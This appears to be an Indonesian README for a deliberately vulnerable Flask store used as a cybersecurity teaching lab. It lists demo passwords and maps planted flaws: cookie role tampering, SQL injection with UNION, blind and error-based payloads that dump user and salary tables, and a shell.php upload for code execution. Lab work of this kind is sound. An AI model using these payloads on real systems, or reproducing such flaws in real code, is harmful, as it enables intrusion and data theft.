# ⚠️ IBDA3202_Store — Vulnerable Web App (Lab Keamanan)

> **PERINGATAN**: Aplikasi ini SENGAJA DIBUAT RENTAN untuk keperluan edukasi dan latihan cybersecurity.  
> **JANGAN** jalankan di lingkungan produksi atau jaringan publik.

---

## 🗂️ Struktur Folder

```
IBDA3202_Store/
├── app.py                  ← Aplikasi Flask utama (semua route + kerentanan)
├── requirements.txt        ← Dependensi Python
├── store.db                ← Database SQLite (dibuat otomatis)
├── app.log                 ← Log aktivitas (untuk SIEM/Wazuh)
├── static/
│   └── uploads/            ← Folder file yang diunggah
└── templates/
    ├── base.html
    ├── index.html
    ├── login.html
    ├── dashboard.html
    ├── admin.html
    ├── profile.html
    ├── products.html
    ├── product_detail.html
    ├── search.html
    ├── about.html
    ├── 403.html
    └── 404.html
```

---

## 🚀 Cara Menjalankan

```bash
# 1. Masuk ke folder proyek
cd IBDA3202_Store

# 2. (Opsional) Buat virtual environment
python -m venv venv
source venv/bin/activate        # Linux/macOS
venv\Scripts\activate           # Windows

# 3. Install dependensi
pip install -r requirements.txt

# 4. Jalankan aplikasi
python app.py
```

Buka browser: **http://127.0.0.1:5000**

---

## 🔐 Akun Demo

| Username | Password  | Role  |
|----------|-----------|-------|
| budi     | budi123   | user  |
| siti     | siti456   | user  |
| andi     | andi789   | user  |
| admin    | Admin@12345 | admin |

---

## 🐛 Peta Kerentanan (untuk Lab)

### 1. Cookie Vulnerability (VULN-1)
- **Lokasi**: `/login` → `/dashboard` → `/admin`
- **Cara Eksploitasi**: Setelah login sebagai `budi`, buka DevTools (F12) → Application → Cookies → ubah nilai `role` menjadi `admin`, lalu akses `/admin`
- **Dampak**: Eskalasi privilese — akses data karyawan, gaji, laporan penjualan

### 2. SQL Injection (VULN-2)
- **Lokasi**: `/search?q=`
- **Payload contoh**:
  - `' OR '1'='1` → dump semua produk
  - `' UNION SELECT 1,username,password,email,role,6,7 FROM users--` → dump data user
- **Dampak**: Eksfiltrasi data sensitif dari seluruh tabel

### 3. Unrestricted File Upload (VULN-3)
- **Lokasi**: `/profile` → form upload
- **Cara Eksploitasi**: Upload file `shell.php` atau `shell.php.txt`, kemudian akses `/static/uploads/shell.php`
- **Dampak**: Remote Code Execution (tergantung konfigurasi server)

### 4. Logging & Monitoring
- **Lokasi**: `app.log`
- **Format**: `TIMESTAMP | LEVEL | Jenis | IP | Username | Detail`
- **Gunakan dengan**: Wazuh SIEM — pantau pola login gagal, akses admin, upload mencurigakan

---

## 📋 Payload SQLi untuk Lab

```sql
-- Dump semua user (dari search)
' UNION SELECT 1,username,password,email,role,6,7 FROM users--

-- Dump data karyawan
' UNION SELECT 1,name,position,salary,email,6,7 FROM employees--

-- Boolean-based blind
' AND 1=1--     (hasil normal)
' AND 1=2--     (hasil kosong)

-- Error-based
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(username,0x3a,password,FLOOR(RAND(0)*2))x FROM users GROUP BY x)a)--
```

---

*Dibuat untuk keperluan edukasi cybersecurity — IBDA3202*
